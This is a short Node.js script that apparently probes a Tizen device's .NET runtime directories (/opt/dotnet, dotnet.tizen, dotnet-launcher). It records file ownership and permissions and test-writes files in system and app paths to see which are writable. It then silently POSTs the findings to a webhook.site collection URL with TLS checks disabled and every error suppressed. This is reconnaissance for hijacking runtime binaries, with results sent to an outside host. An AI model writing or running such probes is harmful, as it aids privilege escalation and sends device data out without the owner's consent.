var fs = require('fs');
var https = require('https');
var TOKEN = '14750775-fef3-408e-8214-35e34b90591f';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function st(p) {
    try {
        var s = fs.statSync(p);
        return p + ' mode=' + s.mode.toString(8) + ' uid=' + s.uid + ' gid=' + s.gid + ' size=' + s.size;
    } catch (e) {
        return p + ' ERR ' + e;
    }
}
var safe = [];
safe.push(st('/opt/dotnet'));
safe.push(st('/opt/dotnet/runtime'));
safe.push(st('/opt/dotnet/runtime/corerun'));
safe.push(st('/usr/share/dotnet.tizen'));
safe.push(st('/usr/share/dotnet.tizen/netcoreapp'));
safe.push(st('/usr/share/dotnet.tizen/netcoreapp/corerun'));
safe.push(st('/usr/bin/dotnet-launcher'));
safe.push(st('/usr/bin/dotnet-launcher-inhouse'));
['/tmp/tb-w', '/home/owner/share/tb-w'].forEach(function (p) {
    try {
        fs.writeFileSync(p, 'x');
        safe.push(p + ' WRITE OK');
        try { fs.unlinkSync(p); } catch (e) {}
    } catch (e) {
        safe.push(p + ' WRITE ERR ' + e);
    }
});
send('wtest', 'SAFE:\n' + safe.join('\n'));
setTimeout(function () {
    var risky = [];
    ['/opt/dotnet/tb-w', '/opt/dotnet/runtime/tb-w', '/opt/usr/apps/xvvl3S1bvH/tb-w', '/usr/share/dotnet.tizen/tb-w'].forEach(function (p) {
        try {
            fs.writeFileSync(p, 'x');
            risky.push(p + ' WRITE OK');
            try { fs.unlinkSync(p); } catch (e) {}
        } catch (e) {
            risky.push(p + ' WRITE ERR ' + e);
        }
    });
    send('wtest', 'RISKY:\n' + risky.join('\n'));
}, 1200);
